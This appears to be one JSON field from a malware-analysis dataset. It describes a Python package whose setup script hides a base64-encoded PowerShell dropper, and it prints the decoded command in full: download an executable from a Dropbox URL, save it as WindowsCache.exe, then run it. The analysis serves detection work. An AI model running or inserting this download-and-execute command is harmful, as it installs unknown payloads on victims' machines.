      "malicious_behavior": "This code is malicious. It attempts to execute a hidden PowerShell command using a base64-encoded payload if a file or directory named 'tahg' does not exist. The encoded PowerShell command decodes to: 'powershell Invoke-WebRequest -Uri \"https://dl.dropbox.com/s/szgnyt9zbu0qmv/Esquele.exe?dl=0\" -OutFile \"~/WindowsCache.exe\"; Invoke-Expression \"~/WindowsCache.exe\"'. This means the script downloads an executable file named 'Esquele.exe' from Dropbox, saves it as 'WindowsCache.exe' in the user's home directory, and then executes it. This behavior is typical of malware droppers, which are used to download and run additional malicious payloads on the victim's machine. The use of obfuscation (base64 encoding, hidden PowerShell window, and misleading setup metadata) further indicates an attempt to evade detection. The rest of the code is a decoy setup() call to appear as a legitimate Python package. This code is highly dangerous and should not be executed.",
